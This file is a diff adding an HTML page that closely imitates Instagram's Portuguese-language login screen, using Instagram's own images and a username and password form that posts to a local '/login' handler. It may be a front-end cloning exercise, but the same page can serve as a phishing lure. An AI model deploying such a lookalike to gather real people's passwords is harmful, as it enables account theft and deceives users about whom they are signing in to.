@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <main class="flex-container">
+        <section class="phones">
+            <div class="phones-display">
+                <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1-2x.png/cfd999368de3.png" class="screen" alt="screenshot">
+            </div>
+        </section>
+
+        <section class="auth-section">
+            <div class="login-box">
+                <div class="logo-container">
+                    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a25111000f2.png" alt="Instagram">
+                </div>
+
+                <form action="/login" method="POST">
+    <div class="input-group">
+        <input type="text" name="username" placeholder="Telefone, nome de usuário ou email" required>
+    </div>
+    <div class="input-group">
+        <input type="password" name="password" placeholder="Senha" required>
+    </div>
+    <button type="submit" class="login-btn">Entrar</button>
+</form>
+
+                <div class="divider">
+                    <div class="line"></div>
+                    <div class="or-text">OU</div>
+                    <div class="line"></div>
+                </div>
+
+                <div class="facebook-login">
+                    <button type="button">
+                        <span class="fb-icon"></span>
+                        Entrar com o Facebook
+                    </button>
+                </div>
+
+                <a href="#" class="forgot-password">Esqueceu a senha?</a>
+            </div>
+
+            <div class="signup-box">
+                <p>Não tem uma conta? <a href="#">Cadastre-se</a></p>
+            </div>
+
+            <div class="get-app">
+                <p>Obtenha o aplicativo.</p>
+                <div class="app-links">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym_f00.png" alt="Google Play">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft">
+                </div>
+            </div>
+        </section>
+    </main>
+</body>
+</html>
